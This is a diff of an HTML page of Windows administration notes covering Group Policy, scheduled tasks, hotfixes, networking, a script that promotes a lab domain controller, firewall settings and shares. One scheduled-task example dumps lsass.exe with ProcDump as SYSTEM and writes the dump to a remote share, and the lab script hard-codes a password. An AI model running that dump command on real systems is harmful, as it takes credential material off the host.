 <p>Edit Local Group Policy:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Local Group Policy Editor (with local GPO to Local Security Policy, Administrative Templates...)</span>
 gpedit.msc
@@ -471,14 +462,14 @@ secpol.msc
 <li><p>Click on “OK”.</p></li>
 </ul>
 <p>Export the Local Group Policy:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>secedit /export /cfg system_config.cfg
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>secedit<span class="w"> </span>/export<span class="w"> </span>/cfg<span class="w"> </span>system_config.cfg
 
 <span class="c1"># With at least Windows Vista or Windows Server 2008</span>
-gpresult /H GPReport.html
-gpresult /SCOPE COMPUTER /H GPReport-Computer.html
+gpresult<span class="w"> </span>/H<span class="w"> </span>GPReport.html
+gpresult<span class="w"> </span>/SCOPE<span class="w"> </span>COMPUTER<span class="w"> </span>/H<span class="w"> </span>GPReport-Computer.html
 
 <span class="c1"># Display RSoP summary data (Resultant Set of Policies)</span>
-gpresult /R
+gpresult<span class="w"> </span>/R
 
 <span class="c1"># RSoP GUI</span>
 RSOP.msc
@@ -489,12 +480,12 @@ RSOP.msc
 gpmc.msc
 
 <span class="c1"># Apply the GPO</span>
-gpupdate /force
+gpupdate<span class="w"> </span>/force
 </pre></div>
 </div>
 <p>The Remote Server Administration Tools (RSAT) provides Group Policy PowerShell Cmdlets (<a class="reference external" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee461027%28v=technet.10%29">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee461027%28v=technet.10%29</a>):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-WindowsCapability -Online <span class="p">|</span> ? Name -like <span class="s1">&#39;Rsat.GroupPolicy.Management.Tools*&#39;</span>
-Get-GPOReport -All -ReportType Html -Path GpoReport.html
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-WindowsCapability<span class="w"> </span>-Online<span class="w"> </span><span class="p">|</span><span class="w"> </span>?<span class="w"> </span>Name<span class="w"> </span>-like<span class="w"> </span><span class="s1">&#39;Rsat.GroupPolicy.Management.Tools*&#39;</span>
+Get-GPOReport<span class="w"> </span>-All<span class="w"> </span>-ReportType<span class="w"> </span>Html<span class="w"> </span>-Path<span class="w"> </span>GpoReport.html
 </pre></div>
 </div>
 <p>Logon scripts are located in folder <code class="docutils literal notranslate"><span class="pre">%SystemRoot%\SYSVOL\sysvol\{domain</span> <span class="pre">DNS</span> <span class="pre">name}\Policies\{GUID</span> <span class="pre">of</span> <span class="pre">the</span> <span class="pre">GPO}\User\Scripts\Logon</span></code> (on Domain controllers).
@@ -510,7 +501,7 @@ In GPMC, they are linked to a GPO using either:</p>
 </ul>
 </section>
 <section id="scheduled-tasks">
-<h2>Scheduled tasks<a class="headerlink" href="#scheduled-tasks" title="Permalink to this headline">¶</a></h2>
+<h2>Scheduled tasks<a class="headerlink" href="#scheduled-tasks" title="Link to this heading">¶</a></h2>
 <p>In order to create a scheduled task that runs at 13:37 <a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a> on <code class="docutils literal notranslate"><span class="pre">lsass.exe</span></code> (Local Security Authority Subsystem service process) and uploads the result onto a network share, <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks">schtasks</a> can be used:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># /ru user context under which the task runs</span>
 <span class="c1"># /sc schedule frequency</span>
@@ -518,8 +509,8 @@ In GPMC, they are linked to a GPO using either:</p>
 <span class="c1">#      Python: (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime(&quot;%H:%M&quot;)</span>
 <span class="c1"># /tn task name</span>
 <span class="c1"># /tr task to be run</span>
-schtasks /create /tn <span class="s2">&quot;NameOfMyTask&quot;</span> /ru SYSTEM /sc once /st <span class="m">13</span>:37
-    /tr <span class="s2">&quot;\\192.0.2.42\ro\procdump64.exe -accepteula -ma lsass.exe \\192.0.2.42\rw\lsass.dmp&quot;</span>
+schtasks<span class="w"> </span>/create<span class="w"> </span>/tn<span class="w"> </span><span class="s2">&quot;NameOfMyTask&quot;</span><span class="w"> </span>/ru<span class="w"> </span>SYSTEM<span class="w"> </span>/sc<span class="w"> </span>once<span class="w"> </span>/st<span class="w"> </span><span class="m">13</span>:37
+<span class="w">    </span>/tr<span class="w"> </span><span class="s2">&quot;\\192.0.2.42\ro\procdump64.exe -accepteula -ma lsass.exe \\192.0.2.42\rw\lsass.dmp&quot;</span>
 
 <span class="c1"># List tasks with their status and next run time</span>
 schtasks
@@ -527,27 +518,27 @@ schtasks
 </div>
 </section>
 <section id="software-information">
-<h2>Software information<a class="headerlink" href="#software-information" title="Permalink to this headline">¶</a></h2>
+<h2>Software information<a class="headerlink" href="#software-information" title="Link to this heading">¶</a></h2>
 <p>In order to list the upgrades that have been applied, using DISM (Deployment Image Servicing and Management Tool):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>dism /online /get-packages
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>dism<span class="w"> </span>/online<span class="w"> </span>/get-packages
 </pre></div>
 </div>
 <p>In order to check for an applied update, with its KB number:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>dism /online /get-packages <span class="p">|</span> findstr KB99999
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>dism<span class="w"> </span>/online<span class="w"> </span>/get-packages<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>KB99999
 
 <span class="c1"># systeminfo.exe enumerates the &quot;hotfixes&quot; too</span>
-systeminfo.exe <span class="p">|</span> findstr KB99999
+systeminfo.exe<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>KB99999
 
 <span class="c1"># WMI also provides such an information in</span>
 <span class="c1"># System.Management.ManagementObject#root\CIMV2\Win32_QuickFixEngineering</span>
-wmic qfe get hotfixid <span class="p">|</span> find <span class="s2">&quot;KB99999&quot;</span>
-wmic qfe <span class="p">|</span> find <span class="s2">&quot;KB99999&quot;</span>
+wmic<span class="w"> </span>qfe<span class="w"> </span>get<span class="w"> </span>hotfixid<span class="w"> </span><span class="p">|</span><span class="w"> </span>find<span class="w"> </span><span class="s2">&quot;KB99999&quot;</span>
+wmic<span class="w"> </span>qfe<span class="w"> </span><span class="p">|</span><span class="w"> </span>find<span class="w"> </span><span class="s2">&quot;KB99999&quot;</span>
 
 <span class="c1"># From PowerShell</span>
-Get-WmiObject -query <span class="s1">&#39;select * from win32_quickfixengineering&#39;</span> <span class="p">|</span> foreach <span class="o">{</span><span class="nv">$_</span>.hotfixid<span class="o">}</span>
+Get-WmiObject<span class="w"> </span>-query<span class="w"> </span><span class="s1">&#39;select * from win32_quickfixengineering&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>foreach<span class="w"> </span><span class="o">{</span><span class="nv">$_</span>.hotfixid<span class="o">}</span>
 
 <span class="c1"># https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Management/Get-HotFix?view=powershell-5.1</span>
-Get-HotFix -id KB99999
+Get-HotFix<span class="w"> </span>-id<span class="w"> </span>KB99999
 </pre></div>
 </div>
 <p>The software may be signed using a certificate in a certificate store.</p>
@@ -560,58 +551,58 @@ certlm.msc
 </div>
 </section>
 <section id="boot-configuration">
-<h2>Boot configuration<a class="headerlink" href="#boot-configuration" title="Permalink to this headline">¶</a></h2>
+<h2>Boot configuration<a class="headerlink" href="#boot-configuration" title="Link to this heading">¶</a></h2>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>msconfig
 
-bcdedit /enum all
+bcdedit<span class="w"> </span>/enum<span class="w"> </span>all
 </pre></div>
 </div>
 </section>
 <section id="installed-software">
-<h2>Installed software<a class="headerlink" href="#installed-software" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>wmic product get <span class="s2">&quot;name,version&quot;</span> /format:csv &gt; applications.csv
+<h2>Installed software<a class="headerlink" href="#installed-software" title="Link to this heading">¶</a></h2>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>wmic<span class="w"> </span>product<span class="w"> </span>get<span class="w"> </span><span class="s2">&quot;name,version&quot;</span><span class="w"> </span>/format:csv<span class="w"> </span>&gt;<span class="w"> </span>applications.csv
 </pre></div>
 </div>
 </section>
 <section id="networking">
-<h2>Networking<a class="headerlink" href="#networking" title="Permalink to this headline">¶</a></h2>
+<h2>Networking<a class="headerlink" href="#networking" title="Link to this heading">¶</a></h2>
 <p>Get the current status of the network stack:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Get the configuration of all network adapters</span>
-ipconfig /all
+ipconfig<span class="w"> </span>/all
 
 <span class="c1"># Display the content of the DNS client resolver cache</span>
-ipconfig /displaydns
+ipconfig<span class="w"> </span>/displaydns
 
 <span class="c1"># Get network routes</span>
-route print
+route<span class="w"> </span>print
 
 <span class="c1"># Show the active TCP connections and listening TCP and UDP ports, with PIDs</span>
-netstat -ano
+netstat<span class="w"> </span>-ano
 </pre></div>
 </div>
 <p>TCP port forwarding with netsh:</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>netsh interface portproxy add v4tov4 <span class="nv">listenport</span><span class="o">=</span><span class="m">1234</span> <span class="nv">listenaddress</span><span class="o">=</span><span class="m">192</span>.0.2.42
-    <span class="nv">connectport</span><span class="o">=</span><span class="m">80</span> <span class="nv">connectaddress</span><span class="o">=</span><span class="m">10</span>.13.37.1
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>netsh<span class="w"> </span>interface<span class="w"> </span>portproxy<span class="w"> </span>add<span class="w"> </span>v4tov4<span class="w"> </span><span class="nv">listenport</span><span class="o">=</span><span class="m">1234</span><span class="w"> </span><span class="nv">listenaddress</span><span class="o">=</span><span class="m">192</span>.0.2.42
+<span class="w">    </span><span class="nv">connectport</span><span class="o">=</span><span class="m">80</span><span class="w"> </span><span class="nv">connectaddress</span><span class="o">=</span><span class="m">10</span>.13.37.1
 </pre></div>
 </div>
 <p>On a WindowsDNS server:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Get server information</span>
-dnscmd /info
+dnscmd<span class="w"> </span>/info
 
 <span class="c1"># Enumerate zones and records</span>
-dnscmd /enumzones
-dnscmd /zoneprint <span class="si">${</span><span class="nv">ZONE_NAME</span><span class="si">}</span>
-dnscmd /enumrecords <span class="si">${</span><span class="nv">ZONE_NAME</span><span class="si">}</span> <span class="si">${</span><span class="nv">NODE_NAME</span><span class="si">}</span>
+dnscmd<span class="w"> </span>/enumzones
+dnscmd<span class="w"> </span>/zoneprint<span class="w"> </span><span class="si">${</span><span class="nv">ZONE_NAME</span><span class="si">}</span>
+dnscmd<span class="w"> </span>/enumrecords<span class="w"> </span><span class="si">${</span><span class="nv">ZONE_NAME</span><span class="si">}</span><span class="w"> </span><span class="si">${</span><span class="nv">NODE_NAME</span><span class="si">}</span>
 </pre></div>
 </div>
 <p>To disable IPv6 on all network interfaces (with PowerShell):</p>
-<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-NetAdapterBinding -ComponentID ms_tcpip6 <span class="p">|</span> Where-Object <span class="o">{</span> <span class="nv">$_</span>.Enabled <span class="o">}</span> <span class="p">|</span> ForEach-Object <span class="o">{</span>
-    Disable-NetAdapterBinding -Name <span class="nv">$_</span>.Name -ComponentID ms_tcpip6
-    Get-NetAdapterBinding -Name <span class="nv">$_</span>.Name -ComponentID ms_tcpip6
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>Get-NetAdapterBinding<span class="w"> </span>-ComponentID<span class="w"> </span>ms_tcpip6<span class="w"> </span><span class="p">|</span><span class="w"> </span>Where-Object<span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nv">$_</span>.Enabled<span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>Disable-NetAdapterBinding<span class="w"> </span>-Name<span class="w"> </span><span class="nv">$_</span>.Name<span class="w"> </span>-ComponentID<span class="w"> </span>ms_tcpip6
+<span class="w">    </span>Get-NetAdapterBinding<span class="w"> </span>-Name<span class="w"> </span><span class="nv">$_</span>.Name<span class="w"> </span>-ComponentID<span class="w"> </span>ms_tcpip6
 <span class="o">}</span>
 <span class="c1"># https://support.microsoft.com/en-gb/help/929852/guidance-for-configuring-ipv6-in-windows-for-advanced-users</span>
-reg add <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters&quot;</span> <span class="sb">`</span>
-    /v DisabledComponents /t REG_DWORD /d <span class="m">255</span> /f
+reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters&quot;</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">    </span>/v<span class="w"> </span>DisabledComponents<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">255</span><span class="w"> </span>/f
 </pre></div>
 </div>
 <p>To promote a Windows server (for example an evaluation install from <a class="reference external" href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022</a>) to a Domain controller, first renaming it, in a PowerShell script (<code class="docutils literal notranslate"><span class="pre">.ps1</span></code> file):</p>
@@ -619,60 +610,60 @@ reg add <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servi
 <span class="c1"># - https://github.com/StefanScherer/adfs2/blob/master/scripts/create-domain.ps1</span>
 <span class="c1"># - https://github.com/commial/labs</span>
 
-<span class="nv">$dcname</span> <span class="o">=</span> <span class="s2">&quot;DCLAB&quot;</span>
-<span class="nv">$domain</span> <span class="o">=</span> <span class="s2">&quot;mylab.local&quot;</span>
-<span class="nv">$domainNetbios</span> <span class="o">=</span> <span class="s2">&quot;MYLAB&quot;</span>
+<span class="nv">$dcname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;DCLAB&quot;</span>
+<span class="nv">$domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;mylab.local&quot;</span>
+<span class="nv">$domainNetbios</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;MYLAB&quot;</span>
 
-<span class="k">if</span> <span class="o">(</span><span class="nv">$env</span>:COMPUTERNAME -ne <span class="nv">$dcname</span><span class="o">)</span> <span class="o">{</span>
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Renaming the machine...&quot;</span>
-    Rename-Computer <span class="nv">$dcname</span>
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Please reboot now! (shutdown /t 0 /r)&quot;</span>
-    Exit
+<span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$env</span>:COMPUTERNAME<span class="w"> </span>-ne<span class="w"> </span><span class="nv">$dcname</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Renaming the machine...&quot;</span>
+<span class="w">    </span>Rename-Computer<span class="w"> </span><span class="nv">$dcname</span>
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Please reboot now! (shutdown /t 0 /r)&quot;</span>
+<span class="w">    </span>Exit
 <span class="o">}</span>
 
-<span class="k">if</span> <span class="o">((</span>Get-WmiObject Win32_ComputerSystem<span class="o">)</span>.partofdomain -eq <span class="nv">$false</span><span class="o">)</span> <span class="o">{</span>
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) This system is not part of a domain, configuring a DC&quot;</span>
+<span class="k">if</span><span class="w"> </span><span class="o">((</span>Get-WmiObject<span class="w"> </span>Win32_ComputerSystem<span class="o">)</span>.partofdomain<span class="w"> </span>-eq<span class="w"> </span><span class="nv">$false</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) This system is not part of a domain, configuring a DC&quot;</span>
 
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Installing RSAT tools&quot;</span>
-    Import-Module ServerManager
-    Add-WindowsFeature RSAT-AD-PowerShell,RSAT-AD-AdminCenter
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Installing RSAT tools&quot;</span>
+<span class="w">    </span>Import-Module<span class="w"> </span>ServerManager
+<span class="w">    </span>Add-WindowsFeature<span class="w"> </span>RSAT-AD-PowerShell,RSAT-AD-AdminCenter
 
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Installing AD Domain Services&quot;</span>
-    Install-WindowsFeature AD-domain-services
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Installing AD Domain Services&quot;</span>
+<span class="w">    </span>Install-WindowsFeature<span class="w"> </span>AD-domain-services
 
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Reconfiguring DNS server to localhost&quot;</span>
-    <span class="nv">$adapters</span> <span class="o">=</span> Get-WmiObject Win32_NetworkAdapterConfiguration <span class="p">|</span> Where-Object <span class="o">{</span> <span class="nv">$_</span>.IPAddress <span class="o">}</span>
-    <span class="nv">$adapters</span> <span class="p">|</span> ForEach-Object <span class="o">{</span>
-        <span class="nv">$_</span>.SetDNSServerSearchOrder<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="o">)</span>
-    <span class="o">}</span>
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Reconfiguring DNS server to localhost&quot;</span>
+<span class="w">    </span><span class="nv">$adapters</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-WmiObject<span class="w"> </span>Win32_NetworkAdapterConfiguration<span class="w"> </span><span class="p">|</span><span class="w"> </span>Where-Object<span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nv">$_</span>.IPAddress<span class="w"> </span><span class="o">}</span>
+<span class="w">    </span><span class="nv">$adapters</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="nv">$_</span>.SetDNSServerSearchOrder<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="o">)</span>
+<span class="w">    </span><span class="o">}</span>
 
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Deploying an AD&quot;</span>
-    Import-Module ADDSDeployment
-    <span class="nv">$PlainPassword</span> <span class="o">=</span> <span class="s2">&quot;Super!Password&quot;</span>
-    <span class="nv">$SecurePassword</span> <span class="o">=</span> <span class="nv">$PlainPassword</span> <span class="p">|</span> ConvertTo-SecureString -AsPlainText -Force
-    Install-ADDSForest <span class="sb">`</span>
-        -SafeModeAdministratorPassword <span class="nv">$SecurePassword</span> <span class="sb">`</span>
-        -CreateDnsDelegation:<span class="nv">$false</span> <span class="sb">`</span>
-        -DatabasePath <span class="s2">&quot;C:\Windows\NTDS&quot;</span> <span class="sb">`</span>
-        -DomainMode <span class="s2">&quot;Win2012&quot;</span> <span class="sb">`</span>
-        -DomainName <span class="nv">$domain</span> <span class="sb">`</span>
-        -DomainNetbiosName <span class="nv">$domainNetbios</span> <span class="sb">`</span>
-        -ForestMode <span class="s2">&quot;Win2012&quot;</span> <span class="sb">`</span>
-        -InstallDns:<span class="nv">$true</span> <span class="sb">`</span>
-        -LogPath <span class="s2">&quot;C:\Windows\NTDS&quot;</span> <span class="sb">`</span>
-        -NoRebootOnCompletion:<span class="nv">$true</span> <span class="sb">`</span>
-        -SysvolPath <span class="s2">&quot;C:\Windows\SYSVOL&quot;</span> <span class="sb">`</span>
-        -Force:<span class="nv">$true</span>
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Deploying an AD&quot;</span>
+<span class="w">    </span>Import-Module<span class="w"> </span>ADDSDeployment
+<span class="w">    </span><span class="nv">$PlainPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Super!Password&quot;</span>
+<span class="w">    </span><span class="nv">$SecurePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$PlainPassword</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ConvertTo-SecureString<span class="w"> </span>-AsPlainText<span class="w"> </span>-Force
+<span class="w">    </span>Install-ADDSForest<span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-SafeModeAdministratorPassword<span class="w"> </span><span class="nv">$SecurePassword</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-CreateDnsDelegation:<span class="nv">$false</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-DatabasePath<span class="w"> </span><span class="s2">&quot;C:\Windows\NTDS&quot;</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-DomainMode<span class="w"> </span><span class="s2">&quot;Win2012&quot;</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-DomainName<span class="w"> </span><span class="nv">$domain</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-DomainNetbiosName<span class="w"> </span><span class="nv">$domainNetbios</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-ForestMode<span class="w"> </span><span class="s2">&quot;Win2012&quot;</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-InstallDns:<span class="nv">$true</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-LogPath<span class="w"> </span><span class="s2">&quot;C:\Windows\NTDS&quot;</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-NoRebootOnCompletion:<span class="nv">$true</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-SysvolPath<span class="w"> </span><span class="s2">&quot;C:\Windows\SYSVOL&quot;</span><span class="w"> </span><span class="sb">`</span>
+<span class="w">        </span>-Force:<span class="nv">$true</span>
 
-    Add-Content <span class="s2">&quot;C:\WINDOWS\System32\drivers\etc\hosts&quot;</span> <span class="s2">&quot;127.0.0.1  </span><span class="nv">$dcname</span><span class="s2">.</span><span class="nv">$domain</span><span class="s2">&quot;</span>
+<span class="w">    </span>Add-Content<span class="w"> </span><span class="s2">&quot;C:\WINDOWS\System32\drivers\etc\hosts&quot;</span><span class="w"> </span><span class="s2">&quot;127.0.0.1  </span><span class="nv">$dcname</span><span class="s2">.</span><span class="nv">$domain</span><span class="s2">&quot;</span>
 
-    Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Please reboot now! (shutdown /t 0 /r)&quot;</span>
-    Exit
+<span class="w">    </span>Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Please reboot now! (shutdown /t 0 /r)&quot;</span>
+<span class="w">    </span>Exit
 <span class="o">}</span>
 
-Write-Host <span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span> -f <span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Checking AD services status...&quot;</span>
-<span class="nv">$svcs</span> <span class="o">=</span> <span class="s2">&quot;adws&quot;</span>,<span class="s2">&quot;dns&quot;</span>,<span class="s2">&quot;kdc&quot;</span>,<span class="s2">&quot;netlogon&quot;</span>
-Get-Service -name <span class="nv">$svcs</span> -ComputerName localhost <span class="p">|</span> Select Machinename,Name,Status
+Write-Host<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span><span class="s1">&#39;[{0:HH:mm}]&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="o">(</span>Get-Date<span class="k">)</span><span class="s2">) Checking AD services status...&quot;</span>
+<span class="nv">$svcs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;adws&quot;</span>,<span class="s2">&quot;dns&quot;</span>,<span class="s2">&quot;kdc&quot;</span>,<span class="s2">&quot;netlogon&quot;</span>
+Get-Service<span class="w"> </span>-name<span class="w"> </span><span class="nv">$svcs</span><span class="w"> </span>-ComputerName<span class="w"> </span>localhost<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select<span class="w"> </span>Machinename,Name,Status
 </pre></div>
 </div>
 <p>Then, Active Directory objects can be requested and created with:</p>
@@ -684,68 +675,68 @@ Get-Service -name <span class="nv">$svcs</span> -ComputerName localhost <span cl
 </ul>
 </section>
 <section id="firewall">
-<h2>Firewall<a class="headerlink" href="#firewall" title="Permalink to this headline">¶</a></h2>
+<h2>Firewall<a class="headerlink" href="#firewall" title="Link to this heading">¶</a></h2>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>wf.msc
 
 Get-NetFirewallProfile
 Show-NetFirewallRule
 
-netsh advfirewall <span class="nb">export</span> <span class="s2">&quot;C:\Users\Administrator\Desktop\advfirewallpolicy.wfw&quot;</span>
-netsh advfirewall show allprofiles
-netsh advfirewall show global
-netsh advfirewall firewall dump
+netsh<span class="w"> </span>advfirewall<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="s2">&quot;C:\Users\Administrator\Desktop\advfirewallpolicy.wfw&quot;</span>
+netsh<span class="w"> </span>advfirewall<span class="w"> </span>show<span class="w"> </span>allprofiles
+netsh<span class="w"> </span>advfirewall<span class="w"> </span>show<span class="w"> </span>global
+netsh<span class="w"> </span>advfirewall<span class="w"> </span>firewall<span class="w"> </span>dump
 
 <span class="c1"># On old versions of Windows</span>
-netsh advfirewall dump
+netsh<span class="w"> </span>advfirewall<span class="w"> </span>dump
 </pre></div>
 </div>
 </section>
 <section id="network-shares">
-<h2>Network shares<a class="headerlink" href="#network-shares" title="Permalink to this headline">¶</a></h2>
+<h2>Network shares<a class="headerlink" href="#network-shares" title="Link to this heading">¶</a></h2>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># List the network shares currently used</span>
-net use
+net<span class="w"> </span>use
 
 <span class="c1"># List the shares on a server (use &quot;localhost&quot; for local shares)</span>
-net view my-server /ALL
+net<span class="w"> </span>view<span class="w"> </span>my-server<span class="w"> </span>/ALL
 
 <span class="c1"># List the available shares (from a server)</span>
-net share
-Get-SmbShareAccess C$
+net<span class="w"> </span>share
+Get-SmbShareAccess<span class="w"> </span>C$
 
 <span class="c1"># List shares using WMI (on a remote server or locally)</span>
-<span class="nv">$shares</span> <span class="o">=</span> Get-CIMInstance -Classname Win32_Share -computername my-server -filter <span class="s2">&quot;Type=0&quot;</span>
-<span class="nv">$shares</span> <span class="p">|</span> foreach <span class="o">{</span>
-<span class="s2">&quot;     Share Name   : &quot;</span> + <span class="nv">$_</span>.name + <span class="s2">&quot;</span>
-<span class="s2">     Source Folder: &quot;</span> + <span class="nv">$_</span>.path + <span class="s2">&quot;</span>
-<span class="s2">     Description  : &quot;</span> + <span class="nv">$_</span>.Description + <span class="s2">&quot;</span>
-<span class="s2">     Caption      : &quot;</span> + <span class="nv">$_</span>.Caption + <span class="s2">&quot;</span>
-<span class="s2">     Type         : &quot;</span> + <span class="o">(</span><span class="s1">&#39;0x{0:x}&#39;</span> -f <span class="nv">$_</span>.Type<span class="o">)</span> + <span class="s2">&quot;</span>
